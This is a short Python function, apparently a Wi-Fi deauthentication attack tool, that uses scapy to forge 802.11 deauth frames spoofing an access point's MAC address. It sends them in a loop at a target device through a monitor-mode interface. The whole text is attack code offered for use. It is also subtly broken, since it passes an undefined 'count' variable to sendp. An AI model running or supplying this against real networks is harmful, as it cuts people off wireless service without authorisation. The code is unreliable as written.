from scapy.all import *

def deauth(target_mac, gateway_mac, inter=0.1, loop=1, iface ="wlan0mon", verbose=1):
    #802.11 frame
    #addr1: destination MAC
    #addr2: source MAC
    #addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    #stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    #Send the packet
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)

